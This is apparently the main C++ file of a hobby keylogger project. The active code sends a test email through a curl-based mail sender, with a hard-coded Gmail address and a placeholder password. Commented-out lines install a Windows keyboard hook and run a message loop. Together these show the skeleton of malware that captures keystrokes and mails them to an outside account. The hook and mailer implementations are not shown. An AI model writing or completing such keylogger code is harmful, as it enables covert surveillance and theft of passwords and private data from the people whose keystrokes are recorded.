#include <iostream>

#include "CurlMailSender.h"

int main()
{
    keylogger::mail::CurlMailSender mailSender;
    keylogger::mail::Mail mail{
        "michalovskyyy@gmail.com", "michalovskyyy@gmail.com",
        "siema", "witam pana", {}};
    keylogger::mail::Credentials credentials{"michalovskyyy@gmail.com", "xxx"};
    return mailSender.sendMail(mail, credentials);
    // MSG message;

    // using namespace keylogger;
    // FileSystemHandler::createDirectory(FileSystemHandler::getCurrentPath(true));

    // KeyboardHook hook;

    // hook.installHook();

    // while (GetMessage(&message, nullptr, 0, 0))
    //{
    //	TranslateMessage(&message);
    //	DispatchMessage(&message);
    //}

    // hook.uninstallHook();
}